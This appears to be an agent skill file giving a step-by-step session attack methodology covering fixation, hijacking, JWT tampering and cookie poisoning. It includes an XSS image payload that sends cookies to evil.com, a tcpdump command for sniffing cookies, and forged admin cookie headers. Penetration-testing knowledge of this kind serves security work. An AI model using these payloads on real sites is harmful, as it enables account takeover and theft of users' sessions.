---
name: session-attacks
description: Session attacks - fixation, hijacking, token manipulation, cookie poisoning
---

# Session Attack Methodology

## Step 1: Session Analysis
```
# Capture session token
# Analyze entropy, predictability, expiration
# Check cookie flags: HttpOnly, Secure, SameSite
```

## Step 2: Session Fixation
```
# Set victim's session to attacker's known value
# 1. Attacker creates account, gets session S
# 2. Attacker forces victim to use session S
# 3. Victim logs in with session S
# 4. Attacker uses session S as victim
```

## Step 3: Session Hijacking
```
# XSS to steal session
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

# Network sniffing (if not HTTPS)
tcpdump -i any port 80 | grep "Cookie:"
```

## Step 4: Token Manipulation
```bash
# Modify JWT payload
# Change user_id, role, expiration
# Resign with weak secret or none algorithm

# Modify session cookie
# Change user_id=123 to user_id=456
# Resign if signed
```

## Step 5: Cookie Poisoning
```
# Add custom cookies
Cookie: session=abc; admin=true; role=admin

# Modify existing cookies
Cookie: user_id=123 → user_id=456
```

## Impact
- Account takeover via session hijacking
- Privilege escalation via session fixation
- Data theft via token manipulation
